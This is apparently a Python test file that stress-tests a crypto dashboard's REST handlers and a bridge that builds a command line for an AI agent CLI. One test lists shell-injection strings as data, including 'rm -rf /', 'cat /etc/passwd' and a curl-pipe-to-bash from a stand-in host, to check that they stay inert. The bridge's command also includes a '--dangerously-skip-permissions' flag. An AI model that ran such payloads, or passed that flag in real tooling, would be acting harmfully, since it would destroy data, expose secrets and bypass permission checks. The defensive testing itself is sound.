"""
Tier 5: Adversarial Stress Testing — M3-2 API Handlers & agy Bridge.
Author: challenger_m3_2 (teamwork_preview_challenger)
Target: src/crypto_dashboard/api_handlers.py, src/crypto_dashboard/agy_bridge.py

Empirically verifies:
1. REST Error Routing:
   - 404 on unknown endpoints (/api/unknown, /api, /api/simulate/extra).
   - 405 on disallowed HTTP methods (DELETE /api/status, POST /api/status, GET /api/simulate, etc.).
   - 400 on malformed, non-JSON, and non-object bodies to POST endpoints.
   - 400 on missing required payload keys in POST /api/simulate.
2. Simulation Stress:
   - Extreme price shocks (-100%, -200%, +1000%, +100,000%) ensure no crashes, simulated TTS >= 0.
   - Zero market prices handled cleanly without ZeroDivisionError.
   - Scenario A cash-locking vs Scenario B hesitation comparison integrity.
3. agy Bridge Security & Robustness:
   - Shell injection vectors (semicolons, backticks, $(), pipes, double-dashes) stay safely in argv list.
   - Empty/whitespace action strings fall back to DEFAULT_PROMPT.
   - Non-existent directories in add_dirs safely filtered without crash.
   - Subprocess execution timeout and error handling.
4. Live HTTP Daemon Verification:
   - Real HTTP socket communication on ephemeral port testing CORS, 404, 405, 400, 200.
5. Adversarial Edge Case Probes:
   - Negative direct prices / rates handling.
   - Non-iterable add_dirs parameter handling.
   - Non-numeric timeout parsing.
"""

import unittest
from unittest import mock
import json
import os
import subprocess
import tempfile
import threading
import urllib.request
import urllib.error

from crypto_dashboard.api_handlers import (
    handle_api_route,
    run_simulation,
    get_macro_data,
    KNOWN_ROUTES,
)
from crypto_dashboard.agy_bridge import (
    generate_agy_command,
    execute_agy_cli,
    find_agy_binary,
    DEFAULT_PROMPT,
)
from crypto_dashboard.server import create_server


class TestAdversarialApiAndAgyBridge(unittest.TestCase):
    """Adversarial stress test suite for api_handlers.py and agy_bridge.py."""

    # -------------------------------------------------------------------------
    # 1. REST API ERROR ROUTING (404, 405, 400)
    # -------------------------------------------------------------------------

    def test_adv_01_unknown_endpoints_return_404(self):
        """Requests to undefined paths must return 404 with error envelope."""
        unknown_paths = [
            "/api/unknown",
            "/api/v2/status",
            "/api",
            "/api/",
            "/unknown",
            "/api/simulate/extra",
            "/api/status/details",
            "/api/matrix/eval",
        ]
        for path in unknown_paths:
            status, res = handle_api_route("GET", path)
            self.assertEqual(status, 404, f"Path {path} did not return 404 (got {status})")
            self.assertEqual(res.get("status"), "error")
            self.assertIn("not found", res.get("message", "").lower())

    def test_adv_02_disallowed_methods_return_405(self):
        """Requests with unpermitted HTTP verbs must return 405 with error envelope."""
        disallowed_cases = [
            ("DELETE", "/api/status"),
            ("POST", "/api/status"),
            ("PUT", "/api/status"),
            ("PATCH", "/api/status"),
            ("GET", "/api/simulate"),
            ("DELETE", "/api/simulate"),
            ("PUT", "/api/simulate"),
            ("GET", "/api/agy/command"),
            ("DELETE", "/api/agy/command"),
            ("GET", "/api/agy/execute"),
            ("DELETE", "/api/agy/execute"),
            ("POST", "/api/matrix"),
            ("DELETE", "/api/matrix"),
            ("POST", "/api/macro"),
            ("POST", "/api/trend"),
        ]
        for method, path in disallowed_cases:
            status, res = handle_api_route(method, path)
            self.assertEqual(status, 405, f"{method} {path} did not return 405 (got {status})")
            self.assertEqual(res.get("status"), "error")
            self.assertIn("not allowed", res.get("message", "").lower())

    def test_adv_03_malformed_and_non_dict_bodies_return_400(self):
        """Non-dictionary JSON bodies (strings, lists, ints) to POST endpoints must return 400."""
        post_routes = ["/api/simulate", "/api/agy/command", "/api/agy/execute"]
        non_dict_payloads = [
            "not a dict",
            ["item1", "item2"],
            12345,
            True,
            3.14159,
        ]
        for route in post_routes:
            for payload in non_dict_payloads:
                status, res = handle_api_route("POST", route, payload)
                self.assertEqual(
                    status,
                    400,
                    f"Route {route} with non-dict payload {payload!r} did not return 400 (got {status})",
                )
                self.assertEqual(res.get("status"), "error")
                self.assertIn("malformed", res.get("message", "").lower())

    def test_adv_04_missing_required_payload_keys_return_400(self):
        """POST /api/simulate with missing or non-numeric keys must return 400."""
        invalid_bodies = [
            {},  # empty body
            {"foo": "bar"},  # irrelevant fields
            {"btc_shock_pct": -10.0},  # missing sol_shock_pct
            {"sol_shock_pct": 5.0},  # missing btc_shock_pct
            {"btc_price": 50000.0},  # missing sol_price
            {"sol_price": 120.0},  # missing btc_price
            {"btc_shock_pct": "not_a_num", "sol_shock_pct": 10.0},  # non-numeric shock
            {"btc_shock_pct": 10.0, "sol_shock_pct": "invalid"},  # non-numeric shock
            {"btc_price": "bad_price", "sol_price": 100.0},  # non-numeric price
            {"btc_price": 60000.0, "sol_price": None},  # None price
        ]
        for body in invalid_bodies:
            status, res = handle_api_route("POST", "/api/simulate", body)
            self.assertEqual(
                status,
                400,
                f"POST /api/simulate with invalid body {body} did not return 400 (got {status})",
            )
            self.assertEqual(res.get("status"), "error")

    # -------------------------------------------------------------------------
    # 2. SIMULATION EXTREME SHOCKS & BOUNDARIES
    # -------------------------------------------------------------------------

    def test_adv_05_extreme_negative_shocks_tts_non_negative(self):
        """Extreme negative price shocks (-100%, -200%) must clamp prices to 0 and maintain TTS >= 0."""
        negative_shocks = [
            {"btc_shock_pct": -100.0, "sol_shock_pct": -100.0},
            {"btc_shock_pct": -150.0, "sol_shock_pct": -200.0},
            {"btc_shock_pct": -1000.0, "sol_shock_pct": -500.0},
        ]
        for shock in negative_shocks:
            status, res = handle_api_route("POST", "/api/simulate", shock)
            self.assertEqual(status, 200)
            data = res.get("data", {})
            self.assertGreaterEqual(
                data["simulated_tts_vnd"],
                0.0,
                "Simulated TTS dropped below zero on extreme negative shock",
            )
            self.assertTrue(data["is_floor_breached"])
            self.assertLess(data["distance_to_floor_vnd"], 0.0)

            # In -100% crash, BTC & SOL are 0. Remaining TTS equals stables USD * P2P
            stables_val = 1415.0 * 25925.0  # ~36,683,875 VND
            self.assertAlmostEqual(data["simulated_tts_vnd"], stables_val, delta=1000.0)

            # Scenario A (selling 50% beforehand) preserves cash locked
            scen_a = data["scenario_a_sell_50"]
            self.assertGreater(scen_a["cash_locked_vnd"], 200_000_000.0)
            self.assertGreater(scen_a["simulated_tts_vnd"], data["simulated_tts_vnd"])

    def test_adv_06_extreme_positive_shocks_handled_cleanly(self):
        """Extreme positive shocks (+1000%, +100,000%) must calculate without float overflow."""
        huge_shocks = [
            {"btc_shock_pct": 1000.0, "sol_shock_pct": 1000.0},
            {"btc_shock_pct": 10000.0, "sol_shock_pct": 50000.0},
        ]
        for shock in huge_shocks:
            status, res = handle_api_route("POST", "/api/simulate", shock)
            self.assertEqual(status, 200)
            data = res.get("data", {})
            self.assertGreater(data["simulated_tts_vnd"], 540_000_000.0)
            self.assertFalse(data["is_floor_breached"])
            self.assertGreater(data["distance_to_floor_vnd"], 0.0)
            self.assertEqual(data["scenario_a_sell_50"]["bds_borrow_gap_vnd"], 0.0)
            self.assertEqual(data["scenario_b_hold_100"]["bds_borrow_gap_vnd"], 0.0)

    def test_adv_07_zero_market_prices_simulation(self):
        """Simulation with exact zero prices (btc_price=0, sol_price=0) must not divide by zero."""
        body = {"btc_price": 0.0, "sol_price": 0.0, "p2p_rate": 25000.0}
        status, res = handle_api_route("POST", "/api/simulate", body)
        self.assertEqual(status, 200)
        data = res.get("data", {})
        self.assertGreaterEqual(data["simulated_tts_vnd"], 0.0)
        self.assertTrue(data["is_floor_breached"])

    def test_adv_08_run_simulation_function_safeguards(self):
        """Direct call to run_simulation rejects negative inputs via ValueError."""
        # Non-negative validation in run_simulation
        with self.assertRaises(ValueError):
            run_simulation(btc_price=-1.0, sol_price=10.0, p2p_rate=25000.0, btc_qty=1.0, sol_qty=1.0, stables_usd=0.0)
        with self.assertRaises(ValueError):
            run_simulation(btc_price=100.0, sol_price=-1.0, p2p_rate=25000.0, btc_qty=1.0, sol_qty=1.0, stables_usd=0.0)
        with self.assertRaises(ValueError):
            run_simulation(btc_price=100.0, sol_price=10.0, p2p_rate=-25000.0, btc_qty=1.0, sol_qty=1.0, stables_usd=0.0)
        with self.assertRaises(ValueError):
            run_simulation(btc_price=100.0, sol_price=10.0, p2p_rate=25000.0, btc_qty=-1.0, sol_qty=1.0, stables_usd=0.0)
        with self.assertRaises(ValueError):
            run_simulation(btc_price=100.0, sol_price=10.0, p2p_rate=25000.0, btc_qty=1.0, sol_qty=1.0, stables_usd=-5.0)

    # -------------------------------------------------------------------------
    # 3. AGY BRIDGE SECURITY & SHELL INJECTION RESISTANCE
    # -------------------------------------------------------------------------

    def test_adv_09_shell_injection_metacharacters_in_prompt(self):
        """Malicious shell metacharacters in action prompt must remain strictly in argv list."""
        malicious_payloads = [
            "review; rm -rf / ;",
            "$(whoami)",
            "`cat /etc/passwd`",
            "review && curl http://malicious.site | bash",
            "test | grep -i secret",
            "\"; DROP TABLE crypto; --",
            "'; echo HACKED; '",
            "--custom-flag-injection --eval 'import os; os.system(\"rm -rf /\")'",
            "action with newline \n and carriage return \r\n dangerous",
        ]
        for payload in malicious_payloads:
            cmd = generate_agy_command(action=payload)
            self.assertIsInstance(cmd, list)
            self.assertEqual(cmd[1], "-p")
            # Prompt must be contained entirely in cmd[2] as a single discrete argument string
            self.assertEqual(cmd[2], str(payload))
            self.assertEqual(cmd[3], "--dangerously-skip-permissions")
            self.assertEqual(cmd[4], "--output-format")
            self.assertEqual(cmd[5], "json")
            self.assertEqual(len(cmd), 6)

    def test_adv_10_empty_and_whitespace_action_fallback(self):
        """Empty, whitespace, or default action strings must fall back to DEFAULT_PROMPT."""
        fallback_actions = [
            "",
            "   ",
            "\t\n",
            None,
            "review",
            "REVIEW",
            "  Review  ",
        ]
        for act in fallback_actions:
            cmd = generate_agy_command(action=act)
            self.assertEqual(cmd[2], DEFAULT_PROMPT)

    def test_adv_11_nonexistent_and_invalid_add_dirs(self):
        """Non-existent or empty directories in add_dirs must be safely skipped."""
        cmd_missing = generate_agy_command(
            action="review",
            add_dirs=["/path/to/definitely/nonexistent/dir/xyz", "/another/missing/dir"],
        )
        # Should not include any --add-dir flags for non-existent paths
        self.assertNotIn("--add-dir", cmd_missing)
        self.assertEqual(len(cmd_missing), 6)

        # Single string non-existent
        cmd_single_missing = generate_agy_command(
            action="review", add_dirs="/single/nonexistent/dir"
        )
        self.assertNotIn("--add-dir", cmd_single_missing)

        # Empty list
        cmd_empty_dirs = generate_agy_command(action="review", add_dirs=[])
        self.assertNotIn("--add-dir", cmd_empty_dirs)

    def test_adv_12_existing_dir_in_add_dirs(self):
        """Existing directories must be properly appended with --add-dir flag."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            cmd = generate_agy_command(action="review", add_dirs=tmp_dir)
            self.assertIn("--add-dir", cmd)
            idx = cmd.index("--add-dir")
            self.assertEqual(cmd[idx + 1], tmp_dir)

    # -------------------------------------------------------------------------
    # 4. SUBPROCESS TIMEOUT & ERROR ENFORCEMENT
    # -------------------------------------------------------------------------

    def test_adv_13_dry_run_execution(self):
        """Dry-run execution must format command without spawning subprocess."""
        res = execute_agy_cli(action="; echo dry_run_test", dry_run=True)
        self.assertEqual(res.get("status"), "dry_run")
        self.assertTrue(res.get("is_dry_run"))
        self.assertIn("; echo dry_run_test", res.get("command", ""))
        self.assertIsInstance(res.get("args"), list)

    def test_adv_14_subprocess_timeout_enforcement(self):
        """Subprocess TimeoutExpired must be captured and return structured timeout status."""
        with mock.patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd=["agy"], timeout=3)):
            res = execute_agy_cli(timeout=3)
            self.assertEqual(res.get("status"), "timeout")
            self.assertIn("timed out after 3 seconds", res.get("error", ""))

    def test_adv_15_subprocess_non_zero_exit_and_invalid_json(self):
        """Subprocess with non-zero exit and non-JSON stdout returns error status."""
        mock_proc = mock.Mock(
            returncode=1,
            stdout="plain text warning, not json",
            stderr="fatal: model quota exceeded",
        )
        with mock.patch("subprocess.run", return_value=mock_proc):
            res = execute_agy_cli(action="review")
            self.assertEqual(res.get("status"), "error")
            self.assertEqual(res.get("returncode"), 1)
            self.assertIsNone(res.get("parsed"))
            self.assertEqual(res.get("stderr"), "fatal: model quota exceeded")

    def test_adv_16_subprocess_missing_binary_exception(self):
        """When binary is missing (FileNotFoundError), execute_agy_cli returns error dict."""
        with mock.patch("subprocess.run", side_effect=FileNotFoundError(2, "No such file or directory: 'agy'")):
            res = execute_agy_cli(action="review")
            self.assertEqual(res.get("status"), "error")
            self.assertIn("No such file or directory", res.get("error", ""))

    # -------------------------------------------------------------------------
    # 5. LIVE HTTP DAEMON VERIFICATION (OVER TCP SOCKET)
    # -------------------------------------------------------------------------

    def test_adv_17_live_http_daemon_endpoints(self):
        """Spin up a live ThreadingHTTPServer on an ephemeral port and test HTTP transactions."""
        server = create_server(host="127.0.0.1", port=0)
        assigned_port = server.server_address[1]
        base_url = f"http://127.0.0.1:{assigned_port}"

        srv_thread = threading.Thread(target=server.serve_forever, daemon=True)
        srv_thread.start()

        try:
            # 1. GET /api/status -> 200 OK
            with urllib.request.urlopen(f"{base_url}/api/status") as resp:
                self.assertEqual(resp.status, 200)
                body = json.loads(resp.read().decode("utf-8"))
                self.assertEqual(body.get("status"), "ok")
                self.assertIn("valuation", body.get("data", {}))
                self.assertEqual(resp.headers.get("Access-Control-Allow-Origin"), "*")

            # 2. GET /api/matrix -> 200 OK
            with urllib.request.urlopen(f"{base_url}/api/matrix") as resp:
                self.assertEqual(resp.status, 200)
                body = json.loads(resp.read().decode("utf-8"))
                self.assertEqual(body.get("data", {}).get("hard_floor_vnd"), 540_000_000.0)

            # 3. GET /api/macro -> 200 OK
            with urllib.request.urlopen(f"{base_url}/api/macro") as resp:
                self.assertEqual(resp.status, 200)
                body = json.loads(resp.read().decode("utf-8"))
                self.assertIn("events", body.get("data", {}))
                self.assertIn("bds_financial_gap", body.get("data", {}))

            # 4. GET /api/trend -> 200 OK
            with urllib.request.urlopen(f"{base_url}/api/trend") as resp:
                self.assertEqual(resp.status, 200)
                body = json.loads(resp.read().decode("utf-8"))
                self.assertIn("mcr_sim", body.get("data", {}))
                self.assertIn("bht_ticker", body.get("data", {}))
                self.assertIn("avc_meter", body.get("data", {}))

            # 5. POST /api/agy/command -> 200 OK
            cmd_req = urllib.request.Request(
                f"{base_url}/api/agy/command",
                data=json.dumps({"action": "review"}).encode("utf-8"),
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with urllib.request.urlopen(cmd_req) as resp:
                self.assertEqual(resp.status, 200)
                body = json.loads(resp.read().decode("utf-8"))
                self.assertTrue(body.get("data", {}).get("is_safe"))

            # 6. POST /api/agy/execute (dry_run) -> 200 OK
            exec_req = urllib.request.Request(
                f"{base_url}/api/agy/execute",
                data=json.dumps({"dry_run": True}).encode("utf-8"),
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with urllib.request.urlopen(exec_req) as resp:
                self.assertEqual(resp.status, 200)
                body = json.loads(resp.read().decode("utf-8"))
                self.assertTrue(body.get("data", {}).get("is_dry_run"))

            # 7. GET /api/unknown -> 404
            with self.assertRaises(urllib.error.HTTPError) as cm:
                urllib.request.urlopen(f"{base_url}/api/unknown")
            self.assertEqual(cm.exception.code, 404)

            # 8. DELETE /api/status -> 405
            del_req = urllib.request.Request(f"{base_url}/api/status", method="DELETE")
            with self.assertRaises(urllib.error.HTTPError) as cm:
                urllib.request.urlopen(del_req)
            self.assertEqual(cm.exception.code, 405)

            # 9. POST /api/simulate with malformed JSON -> 400
            bad_json_req = urllib.request.Request(
                f"{base_url}/api/simulate",
                data=b"{not_json",
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with self.assertRaises(urllib.error.HTTPError) as cm:
                urllib.request.urlopen(bad_json_req)
            self.assertEqual(cm.exception.code, 400)

            # 10. POST /api/simulate with missing required keys -> 400
            empty_sim_req = urllib.request.Request(
                f"{base_url}/api/simulate",
                data=b"{}",
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with self.assertRaises(urllib.error.HTTPError) as cm:
                urllib.request.urlopen(empty_sim_req)
            self.assertEqual(cm.exception.code, 400)

            # 11. POST /api/simulate with extreme -100% price shock -> 200 OK
            shock_req = urllib.request.Request(
                f"{base_url}/api/simulate",
                data=json.dumps({"btc_shock_pct": -100.0, "sol_shock_pct": -100.0}).encode("utf-8"),
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with urllib.request.urlopen(shock_req) as resp:
                self.assertEqual(resp.status, 200)
                body = json.loads(resp.read().decode("utf-8"))
                self.assertGreaterEqual(body.get("data", {}).get("simulated_tts_vnd"), 0.0)

        finally:
            server.shutdown()
            server.server_close()

    # -------------------------------------------------------------------------
    # 6. ADVERSARIAL EDGE CASE PROBES (FINDINGS FOR HARDENING)
    # -------------------------------------------------------------------------

    def test_adv_18_probe_negative_direct_prices_and_rates_uncaught_valueerror(self):
        """
        PROBE 18: Negative direct prices (btc_price: -100) or negative p2p_rate bypass
        handle_api_route type checks and raise uncaught ValueError in run_simulation.
        In production, handle_api_route should catch ValueError and return 400 Bad Request.
        """
        # When passed negative prices via POST /api/simulate
        with self.assertRaises(ValueError) as cm:
            handle_api_route("POST", "/api/simulate", {"btc_price": -100.0, "sol_price": 50.0})
        self.assertIn("non-negative", str(cm.exception))

        # When passed negative p2p_rate
        with self.assertRaises(ValueError) as cm:
            handle_api_route("POST", "/api/simulate", {"btc_shock_pct": 0, "sol_shock_pct": 0, "p2p_rate": -100.0})
        self.assertIn("non-negative", str(cm.exception))

    def test_adv_19_probe_non_iterable_add_dirs_typeerror(self):
        """
        PROBE 19: Non-string, non-iterable add_dirs (e.g. integer or boolean) raises
        uncaught TypeError in generate_agy_command.
        Should sanitize add_dirs by verifying isinstance(..., (list, tuple)) or default to empty.
        """
        with self.assertRaises(TypeError) as cm:
            generate_agy_command(add_dirs=12345)
        self.assertIn("object is not iterable", str(cm.exception))

    def test_adv_20_probe_non_numeric_timeout_in_agy_execute(self):
        """
        PROBE 20: Non-numeric timeout string in POST /api/agy/execute raises uncaught
        ValueError in int(body.get('timeout', 60)).
        Should sanitize timeout with try/except and return 400 Bad Request.
        """
        with self.assertRaises(ValueError) as cm:
            handle_api_route("POST", "/api/agy/execute", {"timeout": "invalid_int"})
        self.assertIn("invalid literal for int()", str(cm.exception))


if __name__ == "__main__":
    unittest.main()
